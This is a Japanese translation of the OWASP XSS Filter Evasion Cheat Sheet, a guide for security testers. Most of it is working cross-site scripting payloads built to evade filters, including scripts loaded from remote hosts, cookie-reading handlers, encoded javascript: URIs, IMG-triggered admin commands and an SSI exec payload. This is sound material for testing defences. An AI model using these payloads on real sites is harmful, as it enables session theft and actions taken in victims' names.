# XSSフィルタ回避チートシート 日本語訳

## Attribution

- Original: XSS Filter Evasion Cheat Sheet
- Source: https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
- Copyright: Cheat Sheets Series Team
- License: Creative Commons Attribution-ShareAlike 4.0 International (CC BY-SA 4.0)
- License URL: https://creativecommons.org/licenses/by-sa/4.0/
- Changes: Japanese translation added.
- Retrieved: 2026-05-21

## 日本語訳

# XSS フィルタ回避チートシート

## はじめに

この記事は、アプリケーションセキュリティ専門家向けの Cross Site Scripting (XSS) テストガイドである。このチートシートは、以前 `http://ha.ckers.org/xss.html` にあった RSnake の代表的な XSS Cheat Sheet を基にしていた。現在は OWASP Cheat Sheet Series が、更新・保守された版として提供している。最初期の OWASP Cheat Sheet である [Cross Site Scripting Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) は RSnake の成果に着想を得たものであり、その貢献に謝意を示す。

## テスト

このチートシートは、特定の XSS 防御フィルタを迂回できる一連の XSS 攻撃例をテスターに示すことで、入力フィルタリングが XSS に対する不完全な防御であることを説明している。

### フィルタ回避なしの基本的な XSS テスト

通常の XSS JavaScript インジェクションを使うこの攻撃は、このチートシートの基準線となる。現代のブラウザでは引用符は不要なため、ここでは省略している。

```html
<SCRIPT SRC=https://cdn.jsdelivr.net/gh/Moksh45/host-xss.rocks/index.js></SCRIPT>
```text

### XSS ロケータ (Polyglot)

このテストは、HTML、スクリプト文字列、JavaScript、URL など複数のコンテキストで実行される「polyglot test XSS payload」を投入する。

```javascript
javascript:/*--></title></style></textarea></script></xmp>
<svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+alert(42);//'>
```text

([Gareth Heyes](https://twitter.com/garethheyes) によるこの [tweet](https://twitter.com/garethheyes/status/997466212190781445) に基づく。)

### 不正な A タグ

このテストは [`href`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/a#href) 属性を省略し、イベントハンドラを使った XSS 攻撃を示す。

```javascript
\<a onmouseover="alert(document.cookie)"\>xxs link\</a\>
```text

Chrome は不足している引用符を自動的に挿入する。問題が発生する場合は引用符を省略すると、Chrome が URL やスクリプト内の不足した引用符を補う。

```javascript
\<a onmouseover=alert(document.cookie)\>xxs link\</a\>
```text

(David Cross による投稿、Chrome で検証済み。)

### 不正な IMG タグ

この XSS 手法は、緩いレンダリングエンジンの解釈を利用して IMG タグ内に XSS ベクタを作る。これは引用符で囲む必要がある。この挙動はもともと粗いコーディングを補正するためのものだったと考えられるが、HTML タグを正しく解析することも大幅に難しくする。

```html
<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>
```text

(もとは Begeek による発見だが、すべてのブラウザで動作するように整理・短縮された。)

### fromCharCode

システムがどの種類の引用符も許可しない場合、JavaScript で `fromCharCode` を `eval()` し、必要な XSS ベクタを作成できる。

```html
<a href="javascript:alert(String.fromCharCode(88,83,83))">Click Me!</a>
```text

### SRC ドメインを検査するフィルタを通過するデフォルト SRC タグ

この攻撃は多くの SRC ドメインフィルタを迂回する。イベントハンドラに JavaScript を挿入する手法は、Form、Iframe、Input、Embed など任意の HTML タグ型インジェクションにも当てはまる。また、`onblur` や `onclick` など、そのタグ種別に関連する任意のイベントに置き換えられるため、ここに挙げたインジェクションには広いバリエーションがある。

```html
<IMG SRC=# onmouseover="alert('xxs')">
```text

(David Cross による投稿、Abdullah Hussam による編集。)

### 空にしておくデフォルト SRC タグ

```html
<IMG SRC= onmouseover="alert('xxs')">
```text

### 完全に省略するデフォルト SRC タグ

```html
<IMG onmouseover="alert('xxs')">
```text

### エラー時の Alert

```html
<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
```text

### IMG onerror と JavaScript Alert のエンコード

```html
<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
```text

### 10 進 HTML 文字参照

Firefox では `<IMG` タグ内の `javascript:` ディレクティブを使う XSS 例が動作しないため、この手法では回避策として 10 進 HTML 文字参照を使う。

```html
 <a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">Click Me!</a>
```text

### 末尾セミコロンなしの 10 進 HTML 文字参照

これは、文字列 `&\#XX;` を探す XSS フィルタの迂回に有効なことが多い。多くの人は、合計 7 桁まで数値文字をパディングできることを知らないためである。また、HTML エンコード文字列を終端するにはセミコロンが必須だと誤って仮定する `$tmp\_string =\~ s/.\*\\&\#(\\d+);.\*/$1/;` のようなデコード処理に対しても有用である。この種の処理は実環境で確認されている。

```html
<a href="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">Click Me</a>
```text

### 末尾セミコロンなしの 16 進 HTML 文字参照

この攻撃も `$tmp\_string=\~ s/.\*\\&\#(\\d+);.\*/$1/;` という文字列に対するフィルタに有効である。その処理は `#` 記号の後に数値文字が続くと仮定しているが、16 進 HTML 文字ではそうではない。

```html
<a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29">Click Me</a>
```text

### 埋め込みタブ

この手法は XSS 攻撃文字列を分断する。

<!-- markdownlint-disable MD010-->
```html
 <a href="jav	ascript:alert('XSS');">Click Me</a>
```html
<!-- markdownlint-enable MD010-->

### エンコードされた埋め込みタブ

この手法も XSS を分断できる。

```html
 <a href="jav&#x09;ascript:alert('XSS');">Click Me</a>
```text

### XSS を分断する埋め込み改行

一部の防御側は 10 進 09 から 13 の任意の文字がこの攻撃に使えると主張するが、それは正しくない。動作するのは 09 (水平タブ)、10 (改行)、13 (キャリッジリターン) だけである。参考として [ASCII table](https://man7.org/linux/man-pages/man7/ascii.7.html) を確認すること。次の 4 つの XSS 攻撃例がこのベクタを示している。

```html
<a href="jav&#x0A;ascript:alert('XSS');">Click Me</a>
```text

#### 例 1: 埋め込みキャリッジリターンで XSS 攻撃を分断する

注: 上記では、本来より長い文字列にしている。ゼロは省略できるためである。フィルタが 16 進や 10 進エンコードを 2 文字または 3 文字でなければならないと仮定している例をよく見てきたが、実際の規則は 1 から 7 文字である。

```html
<a href="jav&#x0D;ascript:alert('XSS');">Click Me</a>
```text

#### 例 2: NULL で JavaScript ディレクティブを分断する

NULL 文字も XSS ベクタとして機能するが、上記と同じではない。Burp Proxy のようなツールで直接注入するか、URL 文字列で `%00` を使う必要がある。独自のインジェクションツールを書く場合は、vim で `^V^@` を使うと NULL を生成できる。また、次のプログラムでテキストファイルに生成できる。NULL 文字 `%00` ははるかに有用であり、この例の変種で実際のフィルタを迂回する助けになった。

```bash
perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>;"' > out
```text

#### 例 3: 画像 XSS における JavaScript の前のスペースとメタ文字

これは、フィルタのパターンマッチが `javascript:` という語の中のスペースを考慮していない場合に有用である。その語中のスペースはレンダリングされないため正しいが、引用符と `javascript:` キーワードの間にスペースを入れられないと誤って仮定している。実際には、10 進 1 から 32 の任意の文字を入れられる。

```html
<a href=" &#14;  javascript:alert('XSS');">Click Me</a>
```text

#### 例 4: 英数字以外による XSS

Firefox の HTML パーサは、HTML キーワードの後に英数字以外があると有効ではないとみなし、HTML タグ後の空白または無効なトークンとして扱う。問題は、一部の XSS フィルタが、探しているタグは空白で分断されると仮定している点である。たとえば `\<SCRIPT\\s` は `\<SCRIPT/XSS\\s` と等しくない。

```html
<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>
```text

上記と同じ考え方に基づき、Rsnake の fuzzer を使って発展させたものである。Gecko レンダリングエンジンでは、イベントハンドラと等号の間に、文字、数字、引用符や山括弧などの囲み文字以外の任意の文字を許可するため、クロスサイトスクリプティングブロックを迂回しやすくなる。ここに示すように、グレイヴアクセント文字にも適用される。

```html
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
```text

Yair Amit は、Trident (IE) と Gecko (Firefox) のレンダリングエンジンの間に少し異なる挙動があり、タグとパラメータの間に空白なしでスラッシュだけを置けることを指摘した。システムが空白を許可しない場合、この攻撃で有用になり得る。

```html
<SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>
```text

### 余分な開始山括弧

この XSS ベクタは、開始・終了山括弧の対応を確認してから中のタグを比較する検出エンジンを破れる可能性がある。これは、もちろん難読化解除後に、開始山括弧と関連タグの文字列全体を探す [Boyer-Moore](https://en.wikipedia.org/wiki/Boyer%E2%80%93Moore_string-search_algorithm) のような効率的なアルゴリズムとは異なる。二重スラッシュは末尾の余分な括弧をコメントアウトし、JavaScript エラーを抑制する。

```html
<<SCRIPT>alert("XSS");//\<</SCRIPT>
```text

(Franz Sedlmaier による投稿。)

### 閉じ script タグなし

Firefox では、この XSS ベクタの `\></SCRIPT>` 部分は実際には不要である。Firefox は HTML タグを閉じても安全だと仮定し、閉じタグを追加するためである。Firefox に影響しない次の攻撃とは異なり、この方法では下に追加の HTML を必要としない。必要であれば引用符を追加できるが、通常は不要である。

```html
<SCRIPT SRC=http://xss.rocks/xss.js?< B >
```text

### Script タグ内のプロトコル解決

この変種は、下記の Ozh によるプロトコル解決バイパスに一部基づいており、IE と互換モードの Edge で動作する。スペースが問題になる場所で特に有用であり、もちろんドメインが短いほどよい。ブラウザは SCRIPT タグの文脈で理解するため、エンコード種別に関係なく `.j` は有効である。

```html
<SCRIPT SRC=//xss.rocks/.j>
```text

(Łukasz Pilorz による投稿。)

### 半開き HTML/JavaScript XSS ベクタ

Firefox とは異なり、IE のレンダリングエンジン (Trident) はページに余分なデータを追加しないが、画像内の `javascript:` ディレクティブを許可する。このベクタは閉じ山括弧を必要としないため有用である。これは、この XSS ベクタを注入する位置の下に何らかの HTML タグが存在することを前提にしている。閉じ `>` タグがなくても、下にあるタグがそれを閉じる。注記として、下にある HTML によっては HTML が壊れる。

次のネットワーク侵入検知システム (NIDS) 正規表現 `/((\%3D)|(=))\[^\n\]\*((\%3C)|\<)\[^\n\]+((\%3E)|\>)/` を迂回する。末尾の `>` を必要としないためである。補足すると、これは実環境の XSS フィルタに対し、`<IMG` タグではなく開いたままの `<IFRAME` タグを使う形でも有効だった。

```html
<IMG SRC="`<javascript:alert>`('XSS')"
```text

### JavaScript エスケープのエスケープ

アプリケーションがユーザー情報を JavaScript 内に出力するように書かれている場合、たとえば `<SCRIPT>var a="$ENV{QUERY\_STRING}";</SCRIPT>` のような形で、そこへ独自の JavaScript を注入したいがサーバ側アプリケーションが特定の引用符をエスケープする場合、そのエスケープ文字自体をエスケープすることで回避できる。これが注入されると `<SCRIPT>var a="\\";alert('XSS');//";</SCRIPT>` と読まれ、二重引用符のエスケープが解除されて XSS ベクタが発火する。

```javascript
\";alert('XSS');//
```text

埋め込みデータに正しい JSON または JavaScript エスケープが適用されているが HTML エンコーディングがされていない場合の代替手段は、script ブロックを終了して独自のブロックを開始することである。

```html
</script><script>alert('XSS');</script>
```text

### title タグの終了

これは `<TITLE>` タグを閉じる単純な XSS ベクタであり、悪意のあるクロスサイトスクリプティング攻撃を包み込める。

```html
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
```text

#### INPUT Image

```html
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
```text

#### BODY Image

```html
<BODY BACKGROUND="javascript:alert('XSS')">
```text

#### IMG Dynsrc

```html
<IMG DYNSRC="javascript:alert('XSS')">
```text

#### IMG Lowsrc

```html
<IMG LOWSRC="javascript:alert('XSS')">
```text

### List-style-image

この難解な攻撃は、箇条書きリスト用の画像埋め込みに注目する。JavaScript ディレクティブに依存するため IE レンダリングエンジンでのみ動作する。特に有用な XSS ベクタではない。

```html
<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
```text

### 画像内の VBscript

```html
<IMG SRC='vbscript:msgbox("XSS")'>
```text

### SVG Object タグ

```html
<svg/onload=alert('XSS')>
```text

### ECMAScript 6

```javascript
Set.constructor`alert\x28document.domain\x29
```text

### BODY タグ

この攻撃は、XSS 攻撃を実現するために `javascript:` や `<SCRIPT...` の変種を使う必要がない。Dan Crowley は、等号の前にスペースを置けることを指摘している (`onload=` と `onload =` は異なる)。

```html
<BODY ONLOAD=alert('XSS')>
```text

#### イベントハンドラを使った攻撃

BODY タグによる攻撃は、上記と似た XSS 攻撃で使えるように変更できる。執筆時点では、この一覧はネット上で最も包括的なものとされている。HTML+TIME の更新について Rene Ledosquet に謝意を示す。

[Dottoro Web Reference](http://help.dottoro.com/) にも JavaScript イベントの優れた [list of events in JavaScript](http://help.dottoro.com/ljfvvdnm.php) がある。

次のイベントハンドラは、ブラウザや要素の状態変化、ユーザー操作、データ更新、メディア再生、履歴操作、フォーム送信などを契機に攻撃文字列を実行する候補になる。括弧内の説明は原文の発火条件を要約したものである。

- `onAbort()` (画像読み込みをユーザーが中止したとき)
- `onActivate()` (オブジェクトがアクティブ要素に設定されたとき)
- `onAfterPrint()` (印刷または印刷プレビュー後)
- `onAfterUpdate()` (ソースオブジェクトのデータ更新後)
- `onBeforeActivate()` (アクティブ要素に設定される前)
- `onBeforeCopy()` / `onCopy()` (選択範囲のコピー直前またはコピー時。`execCommand("Copy")` で悪用可能)
- `onBeforeCut()` / `onCut()` (選択範囲の切り取り直前または切り取り時)
- `onBeforeDeactivate()` / `onDeactivate()` (アクティブ要素が変わるとき)
- `onBeforeEditFocus()` (編集可能要素が UI でアクティブ化される前)
- `onBeforePaste()` / `onPaste()` (貼り付け時。`execCommand("Paste")` で強制される場合がある)
- `onBeforePrint()` (印刷前。`print()` や `execCommand("Print")` で誘発可能)
- `onBeforeUnload()` / `onUnload()` (ブラウザやページの終了・遷移時)
- `onBeforeUpdate()` / `onErrorUpdate()` (データ更新の前または更新エラー時)
- `onBegin()` / `onEnd()` / `onRepeat()` / `onResume()` / `onReverse()` / `onSeek()` / `onTimeError()` (HTML+TIME などのタイムライン制御時)
- `onBlur()` / `onFocus()` / `onFocusIn()` / `onFocusOut()` (ウィンドウや要素のフォーカス変化時)
- `onBounce()` / `onFinish()` / `onStart()` (marquee の移動やループ状態に応じて発火)
- `onCellChange()` / `onDataAvailable()` / `onDataSetChanged()` / `onDataSetComplete()` (データプロバイダやデータセットの変化時)
- `onChange()` / `onInput()` / `onPropertyChange()` / `onReadyStateChange()` (入力値、テキスト内容、プロパティ、readyState の変化時)
- `onClick()` / `onDblClick()` / `onContextMenu()` / `onMouseDown()` / `onMouseUp()` / `onMouseEnter()` / `onMouseLeave()` / `onMouseMove()` / `onMouseOut()` / `onMouseOver()` / `onMouseWheel()` (クリック、右クリック、マウス移動やホバー、ホイール操作時)
- `onControlSelect()` / `onSelect()` / `onSelectionChange()` / `onSelectStart()` (制御選択やテキスト選択時。`window.document.execCommand("SelectAll");` で初期化可能)
- `onDrag()` / `onDragStart()` / `onDragEnter()` / `onDragOver()` / `onDragLeave()` / `onDragEnd()` / `onDragDrop()` / `onDrop()` (ドラッグアンドドロップ操作時)
- `onError()` / `onFilterChange()` (文書・画像読み込みエラーや視覚フィルタ変更完了時)
- `onHashChange()` / `onMessage()` / `onPopState()` / `onStorage()` (フラグメント、メッセージ、履歴、ストレージの変化時)
- `onHelp()` (フォーカス中に F1 が押されたとき)
- `onKeyDown()` / `onKeyPress()` / `onKeyUp()` (キー操作時)
- `onLayoutComplete()` (印刷または印刷プレビュー時)
- `onLoad()` (ウィンドウ読み込み後)
- `onLoseCapture()` ( `releaseCapture()` メソッドで悪用可能)
- `onMediaComplete()` / `onMediaError()` / `onTrackChange()` (ストリーミングメディアやプレイリスト状態の変化時)
- `onMove()` / `onMoveStart()` / `onMoveEnd()` / `onResize()` / `onResizeStart()` / `onResizeEnd()` (ページ移動やウィンドウリサイズ時。`self.resizeTo(500,400)` などで誘発可能)
- `onOffline()` / `onOnline()` (ブラウザのオンライン・オフライン状態が変わるとき)
- `onOutOfSync()` / `onSyncRestored()` (タイムラインで定義されたメディア再生能力が中断・復元されるとき)
- `onRedo()` / `onUndo()` (undo 履歴を前後に移動したとき)
- `onReset()` / `onSubmit()` (フォームのリセットまたは送信時)
- `onRowsEnter()` / `onRowExit()` / `onRowDelete()` / `onRowInserted()` (データソースの行変更時)
- `onScroll()` (スクロール時。`scrollBy()` で誘発可能)
- `onStop()` (停止ボタンまたはページ離脱時)
- `onURLFlip()` (HTML+TIME メディアタグで再生される ASF ファイルが埋め込みスクリプトコマンドを処理したとき)
- `seekSegmentTime()` (セグメントタイムライン上の指定点を探し、その位置から再生を開始するメソッド)

#### BGSOUND

```javascript
<BGSOUND SRC="javascript:alert('XSS');">
```text

#### & JavaScript includes

```html
<BR SIZE="&{alert('XSS')}">
```text

#### STYLE sheet

```html
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
```text

### リモートスタイルシート

リモートスタイルシートのような単純なものを使うだけで、style パラメータを埋め込み expression で再定義できるため XSS を含められる。これは IE でのみ動作する。ページ上には JavaScript が含まれていることを示すものがない点に注意する。注記として、これらのリモートスタイルシート例はすべて body タグを使うため、ベクタ自体以外のコンテンツがページにないと動作しない。空白ページで動かすには、ページに 1 文字を追加する必要がある。

```html
<LINK REL="stylesheet" HREF="http://xss.rocks/xss.css">
```text

#### リモートスタイルシート part 2

上と同じように動作するが、`<LINK>` タグではなく `<STYLE>` タグを使う。このベクタのわずかな変種は Google Desktop の侵害に使われた。補足として、ベクタの直後にそれを閉じる HTML がある場合、末尾の `</STYLE>` タグを削除できる。これは、クロスサイトスクリプティング攻撃内に等号もスラッシュも置けない場合に有用であり、少なくとも一度は実環境で発生している。

```html
<STYLE>@import'http://xss.rocks/xss.css';</STYLE>
```text

#### リモートスタイルシート part 3

これは Gecko レンダリングエンジンでのみ動作し、XUL ファイルを親ページにバインドすることで機能する。

```html
<STYLE>BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}</STYLE>
```text

### XSS のために JavaScript を分断する STYLE タグ

この XSS は、IE を alert の無限ループに陥らせることがある。

```html
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
```text

### Expression を分断する STYLE 属性

```html
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
```text

(Roman Ivanov による作成。)

### Expression を使う IMG STYLE

これは実際には直前 2 つの XSS ベクタの混合だが、STYLE タグを解析し分解することがいかに難しいかをよく示している。IE をループさせる可能性がある。

```html
exp/*<A STYLE='no\xss:noxss("*//*");
xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
```text

### Background-image を使う STYLE タグ

```html
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
```text

### Background を使う STYLE タグ

```html
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
<STYLE type="text/css">BODY{background:url("<javascript:alert>('XSS')")}</STYLE>
```text

### STYLE 属性を持つ匿名 HTML

IE レンダリングエンジンは、作成した HTML タグが実在するかどうかをあまり気にしない。開始山括弧と文字で始まっていればよい。

```html
<XSS STYLE="xss:expression(alert('XSS'))">
```text

### ローカル htc ファイル

これは直前 2 つの XSS ベクタとは少し異なり、XSS ベクタと同じサーバ上にある必要がある `.htc` ファイルを使う。この例のファイルは JavaScript を取り込み、style 属性の一部として実行する。

```html
<XSS STYLE="behavior: url(xss.htc);">
```text

### US-ASCII エンコーディング

この攻撃は 8 ビットではなく 7 ビットの不正な ASCII エンコーディングを使う。この XSS 手法は多くのコンテンツフィルタを迂回する可能性があるが、ホストが US-ASCII エンコーディングで送信している場合、または攻撃者がエンコーディングを自分で設定できる場合にのみ動作する。サーバ側フィルタ回避よりも、Web Application Firewall (WAF) の XSS 回避に対してより有用である。デフォルトで US-ASCII エンコーディングを送信し続けている既知のサーバは Apache Tomcat だけである。

```html
¼ script ¾ alert(¢XSS¢)¼/script ¾
```text

### META

meta refresh の奇妙な点は、ヘッダで referrer を送信しないことである。そのため、参照元 URL を消す必要がある特定種の攻撃で使える。

```html
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
```text

#### Data を使う META

Directive URL scheme。この攻撃手法は、SCRIPT という語や JavaScript ディレクティブを可視的に含まないため便利である。base64 エンコーディングを利用するためである。詳細は [RFC 2397](https://datatracker.ietf.org/doc/html/rfc2397) を参照すること。

```html
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
```text

#### 追加 URL パラメータを持つ META

対象サイトが URL の先頭に `<http://>;` が含まれているか確認しようとする場合、次の手法でそのフィルタ規則を回避できる。

```html
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
```text

(Moritz Naumann による投稿。)

### IFRAME

iFrame が許可されている場合、他にも多くの XSS 問題が存在する。

```html
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
```text

### イベントベースの IFRAME

iFrame とほとんどの他の要素は、次のようなイベントベースの混乱を利用できる。

```html
<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
```text

(David Cross による投稿。)

### FRAME

Frame には iFrame と同種の XSS 問題がある。

```html
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
```text

### TABLE

```html
<TABLE BACKGROUND="javascript:alert('XSS')">
```text

#### TD

上と同じように、TD は JavaScript XSS ベクタを含む BACKGROUND に対して脆弱である。

```html
<TABLE><TD BACKGROUND="javascript:alert('XSS')">
```text

### DIV

#### DIV Background-image

```html
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
```text

#### Unicode XSS Exploit を使う DIV Background-image

これは URL パラメータを難読化するために少し変更されている。

```html
<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
```text

(元の脆弱性は、Hotmail の脆弱性として Renaud Lifchitz により発見された。)

#### 追加文字を含む DIV Background-image

RSnake は、IE で開始括弧の後かつ JavaScript ディレクティブの前に許可される誤った文字を検出するため、簡易 XSS fuzzer を作成した。これらは 10 進であるが、もちろん 16 進やパディングも含められる。(次の任意の文字を使用できる: 1-32, 34, 39, 160, 8192-8.13, 12288, 65279)

```html
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
```text

#### DIV Expression

この攻撃の変種は、コロンと `expression` の間に改行を入れることで、実環境の XSS フィルタに対して有効だった。

```html
<DIV STYLE="width: expression(alert('XSS'));">
```text

### Downlevel-Hidden Block

古い IE の downlevel-hidden 条件コメントを使い、HTML コメントとして見える領域にスクリプトを隠せる。

```html
<!--[if gte IE 4]>
<SCRIPT>alert('XSS');</SCRIPT>
<![endif]-->
```text

### BASE タグ

BASE タグを使うと、相対 URL の解決先を攻撃者が制御する場所へ変えられる。末尾の `//` は、後続の文字列をコメントアウトするために使われる。

```html
<BASE HREF="javascript:alert('XSS');//">
```text

### OBJECT タグ

```html
<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>
```text

### XSS ベクタを含む SVG を EMBED する

この攻撃は Firefox でのみ動作する。

```html
<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+YWxlcnQoJ1hTUycpPC9zY3JpcHQ+PC9zdmc+" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
```text

### CDATA 難読化を使う XML Data Island

この XSS 攻撃は IE でのみ動作する。

```html
<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('XSS')"></B></I></XML>
<SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
```text

### XML data island で生成される JavaScript を埋め込んだローカルホスト XML

XML data island を使って、ローカルにホストされた XML 内のスクリプトを HTML に流し込む手法である。

```html
<XML SRC="xsstest.xml" ID=I></XML>
<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
```text

`xsstest.xml` の内容は次のようになる。

```xml
<XSS><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]></C></XSS>
```text

### XML 内の HTML+TIME

```html
<HTML><BODY>
<?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">
<?import namespace="t" implementation="#default#time2">
<t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert('XSS')</SCRIPT>">
</BODY></HTML>
```text

### 数文字しか入らず `.js` がフィルタされる場合

短い入力しか使えず `.js` に対するフィルタがある場合でも、短縮 URL やプロトコル解決を利用して外部スクリプトへ到達できることを示す。

```html
<SCRIPT SRC="http://xss.rocks/xss.jpg"></SCRIPT>
```text

### SSI (Server Side Includes)

この XSS ベクタを使うには、サーバに SSI がインストールされている必要がある。言うまでもないが、サーバ上でコマンドを実行できるなら、より深刻な問題がほぼ確実に存在する。

```html
<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://xss.rocks/xss.js></SCRIPT>'"-->
```text

### PHP

PHP が実行されるコンテキストでは、サーバ側のコード生成や出力により XSS ベクタを構成できる。

```php
<? echo('<SCR)';
echo('IPT>alert("XSS")</SCRIPT>'); ?>
```text

### IMG 埋め込みコマンド

この攻撃は、Web 掲示板のように、パスワード保護された Web ページに注入され、そのパスワード保護が同じドメイン上の他のコマンドにも適用されている場合にのみ動作する。ユーザー削除、ユーザー追加 (ページを訪問したユーザーが管理者の場合)、認証情報の送信などに使われる可能性がある。あまり使われないが、より有用な XSS ベクタの一つである。

```html
<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
```text

#### IMG 埋め込みコマンド part II

これはさらに怖い。自ドメインにホストされていないこと以外、疑わしく見える識別子がまったくないためである。このベクタは 302 または 304 (他のリダイレクトも動作する) を使って画像をコマンドへリダイレクトする。つまり、通常の `<IMG SRC="httx://badguy.com/a.jpg">` が、画像リンクを閲覧したユーザーとしてコマンドを実行する攻撃ベクタになり得る。次は、このベクタを実現する Apache の `.htaccess` 行である。

```apacheconf
Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
```text

(Timo の一部貢献に謝意を示す。)

### Cookie 操作

この方法はかなり目立たないが、`<META` が許可され、それを使って Cookie を上書きできる例がいくつかある。ユーザー名をデータベースから取得するのではなく、ページを訪問したユーザーだけに表示するため Cookie 内に保存しているサイトの例もある。

```html
<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
```text

### HTML 引用符カプセル化を使う XSS

HTML 属性値の引用符の外へ抜け、イベントハンドラや新しいタグを注入することで XSS を作る手法である。入力が既存の属性へ埋め込まれる場合、引用符、山括弧、スペース、イベント名、URL スキームの扱いを確認する必要がある。

```html
<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
```text

```html
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
```text

```html
<IMG SRC=# onmouseover="alert('xxs')">
```text

```html
<IMG SRC= onmouseover="alert('xxs')">
```text

```html
<IMG onmouseover="alert('xxs')">
```text

```html
<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
```text

```html
<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
```text

```html
<IMG SRC="jav&#x09;ascript:alert('XSS');">
```text

```html
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
```text

```html
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
```text

### URL 文字列回避

URL の表現は、ホスト名、IP 表記、エンコード、リダイレクト、プロトコル解決などの差異によりフィルタを迂回できることがある。

#### IP とホスト名

ホスト名の代わりに IP アドレスを使うことで、ホスト名ベースの検査を避けられる場合がある。

```text
http://66.102.7.147/
```text

#### URL エンコーディング

```text
http://%77%77%77%2e%67%6f%6f%67%6c%65%2e%63%6f%6d/
```text

#### DWORD エンコーディング

IP アドレスを DWORD として表現することで、単純な文字列比較を回避できる。

```text
http://1113982867/
```text

#### 16 進エンコーディング

```text
http://0x42.0x0000066.0x7.0x93/
```text

#### 8 進エンコーディング

```text
http://0102.0146.0007.00000223/
```text

#### Base64 エンコーディング

data URL などで base64 を使い、スクリプトや HTML を直接見えにくくできる。

```html
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
```text

#### 混合エンコーディング

複数の URL・数値表現を混ぜることで、単一の正規化しか行わないフィルタを迂回できる。

```text
http://%77%77%77%2e%67%6f%6f%67%6c%65%2e%63%6f%6d%2f
http://0x42.000146.0x7.147/
```text

#### プロトコル解決バイパス

スキーム相対 URL や短縮されたリソース名を使い、フィルタが想定する `http:` や `https:` の文字列を避ける。

```html
<SCRIPT SRC=//xss.rocks/.j>
```text

#### CNAME の削除

DNS 名の別名を外し、フィルタが許可・拒否リストで想定している名前解決結果と異なる形にできる場合がある。絶対 DNS 名を示す末尾ドットも、文字列照合を揺さぶる要素になる。

```text
http://google.com./
```text

#### JavaScript Link Location

JavaScript の link location を利用し、リンク先の評価タイミングや文脈を悪用する。

```html
<A HREF="javascript:document.location='http://www.google.com/'">XSS</A>
```text

